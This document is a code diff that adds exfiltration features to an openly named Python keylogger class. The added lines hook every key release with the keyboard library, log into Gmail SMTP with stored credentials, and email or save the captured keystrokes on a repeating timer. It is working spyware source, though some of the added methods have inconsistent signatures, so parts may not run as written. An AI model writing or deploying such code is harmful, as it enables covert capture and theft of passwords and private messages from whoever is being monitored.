@@ -1,3 +1,7 @@
+import smtplib
+import keyboard
+from main import SEND_REPORT_EVERY, EMAIL_ADDRESS, EMAIL_PASSWORD
+from threading import Timer
 from datetime import datetime
 
 
@@ -33,3 +37,31 @@ class Keylogger:
         with open(f"{self.filename}.txt", "w") as f:
             print(self.log, file=f)
         print(f"[+] Saved {self.filename}.txt")
+
+    @staticmethod
+    def sendmail(self, email, password, message):
+        server = smtplib.SMTP(host="smtp.gmail.com", port=587)
+        server.starttls()
+        server.login(email, password)
+        server.sendmail(email, email, message)
+        server.quit()
+
+    def report(self, to, pwd):
+        if self.log:
+            self.end_dt = datetime.now()
+            self.update_filename()
+            if self.report_method == "email":
+                self.sendmail(to, pwd, self.log)
+            elif self.report_method == "file":
+                self.report_to_file()
+            self.start_dt = datetime.now()
+        self.log = ""
+        timer = Timer(interval=self.interval, function=self.report)
+        timer.daemon = True
+        timer.start()
+
+    def start(self):
+        self.start_dt = datetime.now()
+        keyboard.on_release(callback=self.callback)
+        self.report(EMAIL_ADDRESS, EMAIL_PASSWORD)
+        keyboard.wait()
